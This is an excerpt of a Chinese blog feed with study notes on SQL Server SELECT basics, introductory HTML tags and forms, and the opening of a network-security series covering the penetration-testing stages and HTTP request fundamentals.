        <content type="html"><![CDATA[<p>该笔记的所观看的视频为<a href="https://www.youtube.com/user/waspec">Timothy Liu</a>的&quot;SQL速通&quot;</p><p>所使用的数据库为微软官方提供的学习用数据库：<a href="https://learn.microsoft.com/en-us/sql/samples/adventureworks-install-configure?view=sql-server-ver16&amp;tabs=ssms">AdventureWorks sample databases - SQL Server | Microsoft Learn</a></p><h2 id="基础概念">基础概念</h2><ul><li><p>数据库管理系统 Database Management System <strong>DBMS</strong></p></li><li><p>DBMS客户端 Client/Server C/S架构</p><p>客户端：与数据库管理系统交互的程序，分为两种图形和命令行，而SQL Server的客户端就是SQL Server Management Studio <strong>SSMS</strong></p><p>服务器：正在运行的数据库管理系统，一个服务器可以为多个客户端提供服务</p></li><li><p>数据库：真正存放数据的地方；数据的存储结构针对速度与安全性进行了优化</p><p>数据库的类型有多种，如关系型数据库、文档型数据库等，而SQL Server就是一种关系型数据库，<strong>关系型数据库</strong>是建立在关系模型基础上的数据库，常用在对数据的完整性要求比较高的场景，比如银行系统、销售系统等。<strong>文档型数据库</strong>是一种非关系型数据库，数据作为单条记录保存在数据库，主要应用在大数据处理、应用与分析方面，比如购物应用与页面的广告展示记录系统等。关系型数据库与文档型数据库并不是相对立的，而是互补而成的，关系型数据库存放经过处理后的文档型数据库，而文档型数据库可以存大量未经处理的数据。</p></li><li><p>查询（query）</p><table><thead><tr><th>英文</th><th>中文</th></tr></thead><tbody><tr><td>C:Create</td><td>增</td></tr><tr><td>R:Read</td><td>查</td></tr><tr><td>U:Update</td><td>改</td></tr><tr><td>D:Delete</td><td>删</td></tr></tbody></table></li></ul><h2 id="查询基础">查询基础</h2><h3 id="查询的过程">查询的过程</h3><img src="https://image.icewindy.cn/202210141908072.png" alt="image-20221014190839018" style="zoom: 67%;" /><p><strong>树立思想</strong></p><ol><li>除了关注结果，还需要<strong>关注性能</strong></li><li>随时准备应对错误、排查原因</li></ol><h3 id="select语法定义">SELECT语法定义</h3><p>SELECT语句是SQL查询中最核心的语句。其呈现一种嵌套的形态，各级语法元素层层展开：</p><p><img src="https://image.icewindy.cn/202210151713461.png" alt="image-20221015171333331"></p><p>问题一：表示三种可能 整个表达式不出现、AC、BC</p><p>问题二：最简形式即<code>SELECT &lt;select_list&gt;</code></p><p><code>&lt;select_list&gt;</code>可以让服务器运行的一个运算，例如<code>SELECT 100+100</code>则会让服务器运行<code>100 + 100</code>这个运算，然后返回运算后的结果到客户端：</p><p><img src="https://image.icewindy.cn/202210160138557.png" alt="image-20221016013805527"></p><p>我们在这个运算中，也可以加入设定自变量，通过<code>DECLARE @变量名 数据类型 = 初始值</code>可以声明一个变量。</p><p>问题三：在语法定义中，会出现一个套一个的操作，例如：</p><p><img src="https://image.icewindy.cn/202210160253123.png" alt="image-20221016025343088"></p><p>这种属于是直接的套娃，还有一种是间接的套娃：</p><p><img src="https://image.icewindy.cn/202210160256954.png" alt="image-20221016025618921"></p><p><code>&lt;table_source&gt;</code>表示的是一张“源表格”，“源表格”除了数据库原生的表格，还可以将<code>SELECT语句</code>查询的结果作为一个“源表格”，提供在<code>&lt;table_source&gt;</code>中使用。我们使用<code>AS</code>关键词可以声明一个新的“源表格”：</p><p><img src="https://image.icewindy.cn/202210160302803.png" alt="image-20221016030218768"></p><p>这种嵌套的方式，可以称之为递归。在<code>SELECT语句</code>的定义中是存在递归的解释的。</p><h2 id="select具体使用">SELECT具体使用</h2><h3 id="from子句基础用法">From子句基础用法</h3><p>From涉及到“数据从何而来”的问题。</p><p>From子句最重要的部分是<code>&lt;table_source&gt;</code>，即数据源，一个From子句可以带有多个<code>&lt;table_source&gt;</code>，多个可以产生<strong>正交组合</strong>。正交组合就是将两个表的数据取出来进行两两组合（笛卡尔乘积）。</p><p><code>&lt;table_source&gt;</code>也具有非常丰富的展开，这里暂时仅解释两个基础的用法</p><p><img src="https://image.icewindy.cn/202210172311504.png" alt="image-20221017231151461"></p><p><code>&lt;joined_table&gt;</code>与<code>&lt;pivoted_table&gt;</code>也是非常重要的用法，这四个用法，是From最重要四个用法。</p><h4 id="table-or-view-name"><code>table_or_view_name</code></h4><p><strong>表<code>table</code>的概念：</strong></p><p>表并不是我们看见的执行结果所出现的“表格”，“表格”是对表的抽象逻辑的具体化。</p><ol><li><p>表是数据库存储数据的地方，而且<strong>所有的数据</strong>都是存储在表中。</p></li><li><p>在表里面，是以行和列的<strong>逻辑</strong>进行存储的，行是表里&quot;唯一&quot;的一条数据记录，列是表里所有记录某一个字段的所有记录</p><p>行的&quot;唯一性&quot;由<strong>主键</strong>来保证，当我们在设计表的时候，我们需要通过某行某列的组合保证行的唯一性。</p></li></ol><p><strong>视图<code>view</code>的概念：</strong></p><ol><li>视图是一张由<strong>查询query</strong>定义出来的<strong>虚拟表virtual table</strong></li><li>可以将其视作查看一组数据的时候的<strong>过滤器filter</strong></li></ol><h4 id="derived-table"><code>derived_table</code></h4><ol><li><code>derived_table</code>是来自于数据库的一个<strong>子查询</strong></li><li>其用于作为其他查询的数据输入</li><li><code>derived_table</code>与<code>view</code>可以相互转换，当<code>derived_table</code>比较常用于作为其他查询的数据输入的时候，我们可以将其固化为一个<code>view</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发基础（1）：参考文档或教程、HTML</title>
      <link href="/2022/08/30/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89%EF%BC%9A%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3%E6%88%96%E6%95%99%E7%A8%8B%E3%80%81HTML/"/>
      <url>/2022/08/30/Web%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89%EF%BC%9A%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3%E6%88%96%E6%95%99%E7%A8%8B%E3%80%81HTML/</url>
      
        <content type="html"><![CDATA[<h2 id="参考文档or教程">参考文档or教程</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web">Web 开发技术 | MDN (mozilla.org)</a></p><p><a href="https://www.runoob.com/html/html-tutorial.html">HTML 教程 | 菜鸟教程 (runoob.com)</a></p><p><a href="https://www.runoob.com/css/css-tutorial.html">CSS 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="html简介">HTML简介</h2><p>HTML是一个标记语言，不是一个编程语言。HTML 使用标记标签来描述网页，HTML 文档包含了HTML标签及文本内容。</p><p>HTML标签是HTML所使用的标记，是由尖括号所包围的关键词，如<code>&lt;head&gt;</code>等。HTML标签是成对出现的，第一个标签是开始标签，第二个标签是结束标签。HTML元素就是HTML标签所涵盖的内容。</p><p>HTML的网页结构：</p><p><img src="https://image.icewindy.cn/202208301605882.png" alt="image-20220830160532846"></p><p>一个完整HTML网页：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>first html<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>HHHHHELLO WORLD<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在vscode中，我们新建一个html文件时，我们可以通过英文的<code>!</code>＋回车快速生成html文档的基本结构</p><p>在JB系软件中，可以通过<code>html:5</code>+tab快速生成</p><h2 id="html基础">HTML基础</h2><h3 id="语法">语法</h3><ul><li>HTML 元素以<strong>开始标签</strong>起始</li><li>HTML 元素以<strong>结束标签</strong>终止</li><li><strong>元素的内容</strong>是开始标签与结束标签之间的内容</li><li>某些 HTML 元素具有<strong>空内容</strong></li><li>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束）</li><li>大多数 HTML 元素可拥有<strong>属性</strong></li></ul><p>大部分HTML元素都可以嵌套。</p><h3 id="基本结构标签">基本结构标签</h3><ul><li><p><code>&lt;html&gt;&lt;/html&gt;</code> HTML标签</p><p>根标签，是页面中最大的标签</p></li><li><p><code>&lt;head&gt;&lt;/head&gt;</code> 文档的头部</p><p>注意在head标签中必须设定title标签</p><p><code>&lt;title&gt;&lt;title&gt;</code>设定网页的标题</p></li><li><p><code>&lt;body&gt;&lt;/body&gt;</code> 文档的主体</p><p>包含着HTML文档的所有内容，页面显示的内容都会放在body内</p></li></ul><h3 id="文档类型声明标签">文档类型声明标签</h3><ul><li><p><code>&lt;!DOCTYPE&gt;</code>文档类型声明</p><p>声明HTML的版本，这句代码需要放在HTML文档的最前面</p></li><li><p><code>lang = </code>定义当前文档显示的语言</p><p>作用是给搜索引擎和浏览器作提示作用，并不是限制文档所使用的语言</p></li><li><p><code>&lt;mate charset= &quot;XXXX&quot;&gt;</code> 规定HTML文档使用的字符编码</p><p>一般情况下都是用UTF-8，避免出现乱码现象</p></li></ul><h3 id="常用标签">常用标签</h3><ul><li><p>标题标签 <code>&lt;h1&gt;-&lt;h6&gt;</code> 有大到小递减</p></li><li><p>段落标签<code>&lt;p&gt;&lt;/p&gt;</code> 定义段落，可以将网页分割成多个段落</p><p>特性：会根据浏览器窗口自动换行</p></li><li><p>换行标签<code>&lt;br/&gt;</code> 手动换行 单标签</p></li><li><p>文本格式化标签</p><table><thead><tr><th>语义</th><th>标签</th></tr></thead><tbody><tr><td>加粗</td><td><strong></strong>或<b></b></td></tr><tr><td>倾斜</td><td><em></em>或<i></i></td></tr><tr><td>删除线</td><td><del></del>或<s></s></td></tr><tr><td>下划线</td><td><ins></ins>或<u></u></td></tr></tbody></table></li><li><p><code>&lt;div&gt;</code>和<code>&lt;span&gt;</code>标签</p><p>这两个标签本身是没有含义，是作为一个盒子的存在，用于存储内容</p><p>特点：</p><ol><li><code>&lt;div&gt;</code>一行只能放一个，该标签独占一行，相当于是一种大盒子</li><li><code>&lt;span&gt;</code>一行可以放置多个，相当于是一种小盒子</li></ol></li><li><p>图像标签<code>&lt;img src = &quot;图像URL&quot; /&gt;</code> 单标签</p><p>图像标签有以下属性可以设置：</p><table><thead><tr><th>属性</th><th>属性值</th><th>说明</th></tr></thead><tbody><tr><td>src</td><td>图片路径</td><td>必须属性，用于指定图像文件的路径和文件名</td></tr><tr><td>alt</td><td>文本</td><td>替换文本。图片不能显示时的文字</td></tr><tr><td>title</td><td>文本</td><td>提示文本。鼠标放在图像上显示的文字</td></tr><tr><td>width</td><td>像素</td><td>宽度</td></tr><tr><td>height</td><td>像素</td><td>高度</td></tr><tr><td>border</td><td>像素</td><td>边框的粗细</td></tr></tbody></table><p>图像标签注意点：</p><ol><li>图像标签可以拥有多个属性，必须写在标签名的后面</li><li>属性之间不分先后顺序，标签名与属性、属性与属性之间以空格隔开</li><li>属性采用键值对的格式，即<code>key = &quot;value&quot;</code></li></ol><p>相对路径的含义：</p><table><thead><tr><th>相对路径含义</th><th>符号</th></tr></thead><tbody><tr><td>同一级路径</td><td></td></tr><tr><td>下一级路径</td><td>/</td></tr><tr><td>上一级路径</td><td>…/</td></tr></tbody></table></li><li><p>超链接标签 <code>&lt;a href = &quot;跳转目标&quot; target = &quot;目标窗口弹出方式&quot;&gt;文本或者图像&lt;/a&gt;</code></p><p>作用是从一个页面链接到另外一个页面</p><p><code>target</code>默认为<code>_self</code>，<code>_blank</code>为在新窗口中打开的方式</p><p>在<code>文本或者图像</code>的位置，我们可以填入文本，或者是图像标签之类的各种网页元素</p><p><code>href</code>跳转目标：</p><ol><li><p>外部链接</p></li><li><p>网站内部的其他网页</p></li><li><p>空链接</p></li><li><p>下载链接：文件所在的路径</p></li><li><p>锚点链接：点击链接可以快速定位到页面的某个位置</p><p>找到目标位置的标签，在内部添加一个<code>id = &quot;名字&quot;</code>，在<code>href</code>属性中设置为<code>#名字</code>即可</p></li></ol></li><li><p>注释 <code>&lt;!-- 注释语句 --&gt;</code></p></li></ul><h3 id="特殊字符">特殊字符</h3><p>在HTML中，空格等特殊字符我们需要借助特殊的标记进行表示</p><p>常用的特殊字符：</p><p><img src="https://image.icewindy.cn/202209160127388.png" alt="image-20220916012707314"></p><p>详细请参考<a href="https://www.runoob.com/tags/ref-entities.html">HTML ISO-8859-1 参考手册 | 菜鸟教程 (runoob.com)</a></p><h2 id="表格标签">表格标签</h2><p>表格的主要作用是显示、展示数据</p><h3 id="基本语法">基本语法</h3><p>表格主要由三组标签组成，<code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>、<code>&lt;td&gt;</code></p><ul><li><code>&lt;table&gt;</code>用于定义表格的标签</li><li><code>&lt;tr&gt;</code>用于定义表格的行</li><li><code>&lt;td&gt;</code> <code>table date</code> 即单元格</li><li>三组标签呈现<code>&lt;td&gt; -&gt; &lt;tr&gt; -&gt; &lt;table&gt;</code>的嵌套关系</li></ul><p>表格的基本例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span>17<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202209161037616.png" alt="image-20220916103701582"></p><h3 id="表头单元格标签">表头单元格标签</h3><p><code>&lt;th&gt;</code> 即table head</p><p>表格的第一行一般都是作为表头使用，因此<code>&lt;th&gt;</code>标签可以使得里面的文本内容加粗居中显示，以此表示表头</p><p>注意：这是个单元格大小的标签，与<code>&lt;td&gt;</code>类似</p><h3 id="表格属性">表格属性</h3><p>实际开发中并不常用，实际开发中表格属性往往通过CSS来设置</p><p><img src="https://image.icewindy.cn/202209161303070.png" alt="image-20220916130347019"></p><h3 id="表格结构标签">表格结构标签</h3><p>为了更好的表示表格，可以将被表格分割成表格头部和表格主体两大部分</p><p>在表格标签中，分别用：<code>&lt;thead&gt;</code>表示表格的头部区域、<code>&lt;tbody&gt;</code>表示表格的主体区域</p><p>这两个结构标签位于<code>&lt;table&gt;</code>下面，在<code>&lt;tr&gt;</code>之上</p><p>注意：<code>&lt;thead&gt;</code>的属性与表格总的属性是分隔的，需要额外设置</p><h3 id="合并单元格">合并单元格</h3><p>特殊情况下，我们需要用到多个单元格合并成一个单元格，例：</p><p><img src="https://image.icewindy.cn/202209161313160.png" alt="image-20220916131341116"></p><p>这种情况下，<code>个人简历</code>和<code>图片</code>就用到了合并单元格</p><p><strong>合并单元格的方式：</strong></p><ul><li>跨行合并：rowspan=“合并单元格的个数”</li><li>跨列合并：colspan=“合并单元格的个数”</li></ul><p>合并的代码需要写到目标单元格上：</p><ul><li>跨行：最上侧单元格为目标单元格</li><li>跨列：最左侧单元格为目标单元格</li></ul><p><img src="https://image.icewindy.cn/202209161325942.png" alt="image-20220916132536909"></p><p>举个实现上图的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表标签">列表标签</h2><p>跟表格标签不同，列表最主要是用来<strong>布局</strong></p><p>列表的特点是整齐、整洁、有序，且作为布局会更加自由和方便</p><p>列表主要分为三大类：无序列表、有序列表、自定义列表</p><p><img src="https://image.icewindy.cn/202209161550863.png" alt="image-20220916155000749"></p><h3 id="无序列表">无序列表</h3><p><code>&lt;ul&gt;</code>标签表示无序列表，列表项使用<code>&lt;li&gt;</code>定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>one<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>two<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>three<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>four<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>five<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>&lt;li&gt;</code>里相当于是一个容器，可以容纳任何内容</p><p>无序列表有自己的样式属性，但是在实际使用中，我们往往使用CSS进行设置</p><h3 id="有序列表">有序列表</h3><p><code>&lt;ol&gt;</code>标签表示有序列表，列表项用<code>&lt;li&gt;</code>定义</p><p>与无序列表类似<code>&lt;li&gt;</code>里相当于是一个容器，可以容纳任何内容，且有序列表有自己的样式属性，但开发中更常用CSS进行设置样式</p><h3 id="自定义列表">自定义列表</h3><p>开发中自定义列表常用于对术语或名词进行解释和描述，自定义列表的列表项前面没有任何项目符号</p><p><code>&lt;dl&gt;</code>标签用于表示自定义列表，<code>&lt;dt&gt;</code>用于表示项目/名字，<code>&lt;dd&gt;</code>用于表示详细描述</p><p><code>&lt;dt&gt;</code>和<code>&lt;dd&gt;</code>的关系类似于表头和单元格的关系</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>关注我们<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dd</span>&gt;</span>bilibili<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;dt&gt;</code>和<code>&lt;dd&gt;</code>数量都是没有限制的，比较常用的是一个<code>&lt;dt&gt;</code>对应多个<code>&lt;dd&gt;</code></p><h2 id="表单标签">表单标签</h2><p>表单常用在注册等场景下使用，常用于收集用户的信息和相关数据</p><p>在HTML中，一个完整的表单一般由三部分组成，<strong>表单域、表单控件（表单元素）、提示信息</strong></p><h3 id="表单域">表单域</h3><p>表单域即包含整个表单元素的区域，<code>&lt;form&gt;</code>标签用于定义表单域，以实现用户信息的收集及传递</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url地址&quot;</span> <span class="attr">method</span>=<span class="string">&quot;提交方式&quot;</span> <span class="attr">name</span>=<span class="string">&quot;表单域名称&quot;</span>&gt;</span></span><br><span class="line">表单控件与其他元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>url地址：用于接收并处理表单数据的服务器程序的url地址</p><p>提交方式：可用的取值为，<code>get</code>与<code>post</code>，在我的另外一篇文章（渗透测试（1））中提及两者区别</p><p>名称：用于指定表单的名称，以区分不同表单</p><h3 id="表单控件">表单控件</h3><p>表单控件可用按照使用的方式分为以下几种类型</p><ul><li><p>input输入表单元素</p><p><code>&lt;input&gt;</code>标签可以让用户输入数据，注意，他是一个单标签</p><p>在<code>&lt;input&gt;</code>标签中，包含一个必填的属性<code>type</code>属性，根据不同的属性，输入的字段拥有很多种形式（文本字段、复选框、掩码后的文本控件、单选按钮、按钮等）</p><p><code>type</code>具体可以取得值可以见下表：</p><p><img src="https://image.icewindy.cn/202209170203818.png" alt="image-20220917020311733"></p><p>除了<code>type</code>属性以外，<code>&lt;input&gt;</code>还提供其他属性以供设置，其常用的其他属性如下：</p><p><img src="https://image.icewindy.cn/202209170219563.png" alt="image-20220917021924503"></p><p>其中<code>name</code>值，在用<code>radio</code>实现多选一的时候，必须让多个按钮有同一个<code>name</code>值，才能实现多选一的效果，否则会出现可以多选的问题。复选按钮<code>&lt;checkbox&gt;</code>也同样需要有相同的<code>name</code>值</p><p><code>value</code>属性对于不同<code>type</code>类型，用法也不同：</p><ul><li>对于 <code>button</code>、<code>reset</code>、<code>submit</code> 类型 - 定义按钮上的文本</li><li>对于 <code>text</code>、<code>password</code>、<code>hidden</code> 类型 - 定义输入字段的初始（默认）值</li><li>对于 <code>checkbox</code>、<code>radio</code>、<code>image</code> 类型 - 定义与 input 元素相关的值，当提交表单时该值会发送到表单的 action URL。</li></ul></li><li><p>select下拉表单元素</p><p>下拉表单常用于选择分类之类的地方</p><p>我们可以使用<code>&lt;select&gt;</code>标签控件定义下拉列表，具体的列表选项我们可以使用<code>&lt;option&gt;</code>来进行列出</p><p>在<code>&lt;select&gt;</code>标签应当至少含有一对<code>&lt;option&gt;</code>标签，在<code>&lt;option&gt;</code>标签中设置属性<code>selected = &quot;selected&quot;</code>时会使得当前选项成为默认选项</p></li><li><p>textarea文本域元素</p><p>与<code>&lt;input&gt;</code>标签的 <code>text</code>相类似，都是作为让用户输入文字表单的地方，但是这个文本域元素能提供更大的输入空间，一般用于让用户输入自我介绍等内容的地方，可以理解为大号的 <code>text</code></p><p>这个标签带有两个属性，<code>rows</code>和<code>cols</code>，<code>rows</code>是用于调整每行中的字符数，<code>cols</code>是用于调整显示的行数，但是我们在开发中很少会使用，因为一般都是使用CSS进行大小的调控</p><p>在标签中间填入的内容是用于定义输入字段的初始（默认）值</p></li></ul><h3 id="label-标签"><code>&lt;label&gt;</code>标签</h3><p><code>&lt;label&gt;</code>标签并不属于表单标签，但是常常用于表单中，可以使得用户不比精准点中表单也可以选中选项</p><p><code>&lt;label&gt;</code>标签用于绑定一个表单元素，当点击<code>&lt;label&gt;</code>标签内的元素时，浏览器会自动将焦点（即光标）转向对应的表单元素上，增加用户体验</p><p>绑定的方式是设置<code>for</code>属性，并在表单元素上设定<code>id</code>属性，通过<code>for</code>绑定<code>id</code>属性</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web三板斧 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习（1）：概述、信息收集</title>
      <link href="/2022/08/23/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/08/23/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试基本流程">渗透测试基本流程</h2><ol><li>确定目标</li><li>信息收集</li><li>漏洞探寻</li><li>漏洞分析</li><li>漏洞利用</li><li>信息整理</li><li>形成报告</li></ol><h2 id="计算机网络基础">计算机网络基础</h2><h3 id="http">HTTP</h3><h4 id="请求行">请求行</h4><p>基本概念：</p><p><strong>url:</strong> 统一资源定位符，即我们在浏览器上地址栏的一长串</p><p>例：<a href="https://www.bilibili.com/video/BV1YT411A7fy/">https://www.bilibili.com/video/BV1YT411A7fy/</a></p><p><strong>uri:</strong> 统一资源标识符，去除传输协议（例：https）、去除域名（例：<a href="http://www.bilibili.com">www.bilibili.com</a>）后留下的部分</p><p>例：/video/BV1YT411A7fy/</p><h4 id="请求方式">请求方式</h4><p>HTTP请求方式有七种，常用get、post</p><p>get请求 请求参数在url地址中，url有长度限制</p><p><img src="https://image.icewindy.cn/202209052334587.png" alt="image-20220905233435518"></p><p>post请求 请求参数在请求体中，无大小限制</p><p><img src="https://image.icewindy.cn/202209052334088.png" alt="image-20220905233446026"></p><h4 id="请求头">请求头</h4><p>Host：请求主机域名/ip地址</p><p>User-Agent：提供浏览器的版本信息，供服务器解决浏览器兼容问题</p><p>Accept：传输文件类型（text/html，application/xhtml+xml，application/xml）</p><p>Referer：跳转前的地址，可以用于统计用户来源和防止盗链</p><p>Accept-Encoding：浏览器申明自己可接收的编码方法</p><p>Accept-Language：浏览器申明自己可接收的语言</p><h4 id="响应">响应</h4><ol><li><p><strong>响应行</strong></p><p>协议及版本 响应状态码 